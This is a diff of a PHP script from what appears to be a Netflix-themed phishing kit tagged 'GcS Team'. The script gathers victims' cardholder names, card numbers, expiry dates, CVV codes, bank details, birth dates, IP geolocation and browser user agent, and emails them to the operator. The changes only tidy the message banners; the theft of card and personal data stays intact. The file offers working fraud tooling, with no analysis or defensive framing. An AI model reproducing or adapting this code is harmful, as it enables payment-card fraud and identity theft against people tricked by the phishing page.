@@ -90,12 +90,12 @@ $headers = "From: GcS-Team<info@GcSTeam.com>";
 $send = $email; 
 
 
-$message = "[GcS Team🇩🇿][+]━━━━【🔥 NetFlix CC Fire 🔥】━━━━[+][GcS Team🇩🇿]\r\n";
-$message .= "|Card Holder      	 : ".$_POST['cardholder']."\r\n";
-$message .= "|[💳 Credit Card Number]     	 : ".$_POST['creditCardNumber']."\r\n";
-$message .= "|[🔄 Expiry Date ]     	 : ".$_POST['creditExpirationMonth']."\r\n";
+$message = "━━━━【🔥 NetFlix CC Fire 🔥】━━━━\r\n";
+$message .= "|Card Holder  : ".$_POST['cardholder']."\r\n";
+$message .= "|[💳 Credit Card Number]     : ".$_POST['creditCardNumber']."\r\n";
+$message .= "|[🔄 Expiry Date ]  : ".$_POST['creditExpirationMonth']."\r\n";
 $message .= "|[🔑 (CVV)]    	 : ".$_POST['creditCardSecurityCode']."\r\n";
-$message .= "[+]━━━━【🏦 Bank Details】━━━━[+]\r\n";
+$message .= "━━━━【🏦 Bank Details】━━━━\r\n";
 $message .= "|Bank name 🏦      : ".$_SESSION['bank_name']."\r\n";
 $message .= "|Bank scheme      : ".$_SESSION['bank_scheme']."\r\n";
 $message .= "|Bank type      : ".$_SESSION['bank_type']."\r\n";
@@ -115,7 +115,7 @@ $message .= "|Date of birth 🎂       : ".$_SESSION['birthday']."\r\n";
 $message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
 $message .=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE."country code: " .$countryCode."lat: " .$lat."lon: " .$lon."timezone: " .$timezone."isp: " .$isp."as: " .$as;
 $message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
-$message .= "[GcS Team🇩🇿][+]━━━━【🔥 NetFlix CC Fire 🔥】━━━━[+][GcS Team🇩🇿]\n";
+//$message .= "[GcS Team🇩🇿][+]━━━━【🔥 NetFlix CC Fire 🔥】━━━━[+][GcS Team🇩🇿]\n";
 $_SESSION['message'] = $message;
 mail($send,$subject,$message,$headers);
 
